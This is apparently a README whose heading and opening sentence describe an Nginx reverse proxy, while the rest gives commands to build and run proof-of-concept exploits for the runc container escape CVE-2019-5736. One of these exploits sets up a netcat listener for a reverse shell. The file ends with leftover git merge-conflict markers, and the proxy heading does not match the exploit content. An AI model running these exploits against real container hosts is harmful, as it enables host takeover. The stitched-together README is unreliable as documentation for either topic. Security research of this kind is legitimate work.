# Nginx-Proxy

	## Why proxy ?
---
A reverse proxy intercepts incoming requests and directs them to the appropriate server. Not only does this speed up performance, it also strengthens server security.

Clone the repository:
```sh
$ git clone git@github.com:BBRathnayaka/RunC-CVE-2019-5736.git
```

### Exec POC
Overwrites runc with a simple program that prints a string.

Running the exec POC:
```sh
$ docker build -t cve-2019-5736:exec_POC ./RunC-CVE-2019-5736/exec_POC
$ docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC
$ docker exec poc_ctr bash
```
### Malicious Image POC
Overwrites runc with a simple reverse shell bash script that connects to localhost:2345.

Listen for the reverse shell:
```sh
$ nc -nvlp 2345
```

From a different shell, run the malicious image POC:
```sh
$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC
$ docker run --rm cve-2019-5736:malicious_image_POC
```
#### Reference
```
See [Twistlock Labs](https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/ "Explaining CVE-2019-5763") for an explanation of CVE-2019-5736 and the POCs.

The malicious image POC is heavily based on [q3k’s POC](https://github.com/q3k/cve-2019-5736-poc), so all credit goes to him.
```


=======
>>>>>>> 6336d8e5c8c9804aaeb076ad1fbea1975a3cae6f